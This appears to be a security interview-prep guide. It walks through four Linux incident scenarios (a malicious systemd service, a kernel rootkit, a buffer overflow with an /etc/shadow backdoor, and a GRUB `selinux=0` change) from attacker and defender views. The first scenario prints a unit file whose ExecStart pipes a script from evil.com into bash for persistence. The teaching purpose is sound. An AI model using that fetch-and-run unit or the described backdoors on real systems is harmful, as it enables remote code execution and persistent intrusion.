###Real-World Curveball: Malicious Systemd Service

**Scenario (Question):**  
A suspicious unit file is found in `/etc/systemd/system/updatesync.service`:

[Unit]  
Description=System Update Sync  
After=network.target  

[Service]  
ExecStart=/bin/bash -c 'curl -s http://evil.com/payload.sh | bash'  
Restart=always  

[Install]  
WantedBy=multi-user.target  

**Question:**  
1. From a Red Team perspective, why is this an effective persistence mechanism?  
2. From a Blue Team perspective, what immediate containment actions and long-term defenses should be applied?  
3. Which MITRE ATT&CK techniques and OWASP categories does this map to?  

---

**Answer:**

**Red Team Perspective — Why Effective**  
- Runs automatically on every reboot (systemd = PID 1).  
- Disguised as a legitimate service (`updatesync`).  
- Fetches fresh payloads from a remote server each run.  
- `Restart=always` → ensures resilience, restarts if killed.  

---

**Blue Team Perspective — Defense**  
- **Immediate Actions:**  
  - Disable & stop service safely: `systemctl disable --now updatesync.service`.  
  - Preserve service file for forensics.  
  - Block outbound traffic to `evil.com`.  
  - Review history: `journalctl -u updatesync`.  

- **Long-Term Defenses:**  
  - Baseline & monitor `/etc/systemd/system/*.service` and `.timer`.  
  - File integrity monitoring (Wazuh, OSSEC, auditd).  
  - Restrict creation/enabling of services (least privilege).  
  - Hunt for suspicious service names mimicking legit ones.  

---

**Security Mapping**  
- **MITRE ATT&CK:**  
  - T1053.006 — Scheduled Task/Job: Systemd Services/Timers  
  - T1547 — Boot/Logon Autostart Execution  
- **OWASP:**  
  - A05 — Security Misconfiguration  
  - A08 — Software and Data Integrity Failures  

---

**Interview One-Liner**  
“Malicious systemd services are stealthy persistence: they auto-start at boot, can be disguised, and auto-restart if killed. Defenders must baseline `.service`/`.timer` files, restrict privileges, and preserve evidence during containment.”

### Q3 — Real-World Curveball: Kernel Module + Syscall Hooking

**Scenario (Question):**  
During incident response, you discover:  
1. A suspicious kernel module loaded:  
   lsmod | grep netfilter_hook → unknown entry.  
2. Syscalls like `open()` and `getdents()` are returning incomplete results (some files and processes are hidden).  

**Question:**  
1. From a Red Team perspective, how could this technique be used as persistence or stealth?  
2. From a Blue Team perspective, what detection and defense strategies should be applied?  
3. Which MITRE ATT&CK techniques does this map to?  

---

**Answer:**

**Red Team Perspective**  
- Malicious kernel module + syscall hooking = kernel-level rootkit.  
- Can hide files, processes, and network sockets.  
- Intercept syscalls (`getdents`, `open`) to conceal malware.  
- Provides stealth and persistence until module is removed.  

---

**Blue Team Perspective**  
- **Immediate Actions:**  
  - Inspect running modules (`lsmod`, `modinfo`, `dmesg`).  
  - Safely remove suspicious modules after collecting evidence (`rmmod`).  

- **Long-Term Defenses:**  
  - Enforce **kernel module signing** (`module.sig_enforce=1`).  
  - Restrict loading/unloading modules (`/proc/sys/kernel/modules_disabled`).  
  - Use `auditd`, `rkhunter`, `chkrootkit` to detect syscall anomalies.  
  - Limit root privileges to prevent arbitrary `insmod`/`modprobe`.  

---

**Security Mapping**  
- **MITRE ATT&CK:**  
  - T1547.006 — Boot/Logon Autostart Execution: Kernel Modules  
  - T1014 — Rootkit (hiding processes/files)  
- **OWASP:**  
  - A05 — Security Misconfiguration (unrestricted module loading)  
  - A08 — Software & Data Integrity Failures (tampered syscalls)  

---

**Interview One-Liner**  
“Malicious kernel modules with syscall hooking are classic rootkits — stealthy persistence at kernel level. Defenders must enforce module signing, restrict loading, and monitor syscalls for anomalies.”  

### Q3 — Real-World Curveball: Memory Exploit + Filesystem Abuse

**Scenario (Question):**  
During an investigation, you notice:  
1. An attacker uploaded a binary to `/tmp/.ssh-helper`.  
2. The process exploits a buffer overflow to overwrite the stack and escalate privileges.  
3. The attacker tampers with `/etc/shadow` to insert a backdoor password hash.  

**Question:**  
1. From a Red Team perspective, why is this a powerful persistence chain?  
2. From a Blue Team perspective, what immediate and long-term defenses should be applied?  
3. Which MITRE ATT&CK techniques does this map to?  

---

**Answer:**

**Red Team Perspective**  
- Dropping binary in `/tmp` → world-writable, easy staging location.  
- Buffer overflow exploit → stack overwrite → root privileges.  
- Tampering `/etc/shadow` → adds backdoor password hash for persistent access.  
- Combined effect = File abuse (/tmp) + Memory exploit + Privilege escalation + Persistent account.

---

**Blue Team Perspective**  
- **Immediate:**  
  - Mount `/tmp` with `noexec,nosuid,nodev`.  
  - Kill processes executing from `/tmp`.  
  - Audit `/etc/shadow` for unauthorized entries.  

- **Long-Term:**  
  - Apply ASLR, stack canaries, DEP to block overflows.  
  - File integrity monitoring for `/etc/shadow` and binaries.  
  - Centralized logging for anomalies in privilege escalation.  
  - Restrict root and enforce least privilege.  

---

**Security Mapping**  
- **MITRE ATT&CK:**  
  - T1059.004 — Command & Scripting Interpreter (Bash)  
  - T1547.006 — Boot/Logon Autostart Execution: Modified System Files  
  - T1068 — Exploitation for Privilege Escalation  
  - T1070 — Indicator Removal (temporary directories)  

- **OWASP:**  
  - A05 — Security Misconfiguration (world-writable `/tmp`)  
  - A08 — Software & Data Integrity Failures (tampered `/etc/shadow`)  
  - A09 — Security Logging & Monitoring Failures  

---

**Interview One-Liner**  
“By chaining a buffer overflow with `/tmp` abuse and backdooring `/etc/shadow`, attackers gain stealthy persistence. Defenders must enforce `noexec` on `/tmp`, enable ASLR/DEP, and monitor `/etc/shadow` integrity.”

### Q3 — Real-World Curveball: Breaking the Chain of Trust

**Scenario (Question):**  
During incident response, you find the GRUB config modified with this boot parameter:

linux /vmlinuz-5.10 root=/dev/sda1 ro selinux=0

**Question:**  
1. From a Red Team perspective, why is this an effective way to weaken defenses?  
2. From a Blue Team perspective, what immediate containment and long-term hardening steps should be applied?  
3. Which MITRE ATT&CK techniques and OWASP categories does this map to?  

---

**Answer:**

**Red Team Perspective**  
- Adding `selinux=0` disables SELinux before OS boots, removing mandatory access controls.  
- Strips away exploit mitigations and confinement, making post-exploitation easier.  
- Modified GRUB config could also load alternate/malicious kernels or root filesystems.  
- Breaks the chain of trust at the bootloader stage.

---

**Blue Team Perspective**  
- **Immediate:**  
  - Inspect and restore `/boot/grub.cfg` from trusted backup.  
  - Verify file hashes against known-good configs.  
  - Lock `/boot` as read-only after boot.  

- **Long-Term:**  
  - Enable **UEFI Secure Boot** to enforce signed bootloaders/kernels.  
  - Use only signed kernels and signed modules.  
  - Restrict modification of GRUB configs (root-only + integrity monitoring).  
  - Implement TPM-based attestation for boot integrity.  
  - Monitor kernel parameters for attempts to disable SELinux/AppArmor.  

---

**Security Mapping**  
- **MITRE ATT&CK:**  
  - T1542 — Pre-OS Boot (bootloader tampering)  
  - T1547 — Boot/Logon Autostart Execution  
- **OWASP:**  
  - A05 — Security Misconfiguration (boot with SELinux disabled)  
  - A08 — Software & Data Integrity Failures (tampered boot config)  

---

**Interview One-Liner**  
“Adding `selinux=0` in GRUB config disables Linux MAC protections at boot — a stealthy persistence method. Defenders must enforce Secure Boot, signed kernels/bootloaders, lock `/boot`, and monitor kernel parameters to detect tampering.”